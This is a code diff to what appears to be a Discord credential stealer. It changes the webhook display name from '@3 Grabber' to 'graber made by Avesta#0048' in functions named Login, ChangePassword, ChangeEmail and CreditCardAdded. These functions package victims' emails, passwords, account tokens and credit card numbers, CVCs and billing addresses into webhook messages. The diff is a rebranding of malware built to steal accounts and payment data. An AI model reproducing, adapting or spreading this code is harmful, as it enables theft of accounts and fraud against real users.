@@ -127,7 +127,7 @@ function Login(email, password, token) {
     `, !0).then((ip) => {
             const json = JSON.parse(info);
             var params = {
-                username: "@3 Grabber",
+                username: "graber made by Avesta#0048",
                 content: "",
                 avatar_url: "https://media.discordapp.net/attachments/803151138173353984/909806226529988698/1_1.png",
                 embeds: [
@@ -176,7 +176,7 @@ function ChangePassword(oldpassword, newpassword, token) {
     `, !0).then((ip) => {
             const json = JSON.parse(info);
             var params = {
-                username: "@3 Grabber",
+                username: "graber made by Avesta#0048",
                 content: "",
                 avatar_url: "https://media.discordapp.net/attachments/803151138173353984/909806226529988698/1_1.png",
                 embeds: [
@@ -229,7 +229,7 @@ function ChangeEmail(newemail, password, token) {
         xmlHttp.responseText;
     `, !0).then((ip) => {
             var params = {
-                username: "@3 Grabber",
+                username: "graber made by Avesta#0048",
                 content: "",
                 avatar_url: "https://media.discordapp.net/attachments/803151138173353984/909806226529988698/1_1.png",
                 embeds: [
@@ -283,7 +283,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
     `, !0).then((ip) => {
             var json = JSON.parse(info);
             var params = {
-                username: "@3 Grabber",
+                username: "graber made by Avesta#0048",
                 content: "",
                 avatar_url: "https://media.discordapp.net/attachments/803151138173353984/909806226529988698/1_1.png",
                 embeds: [
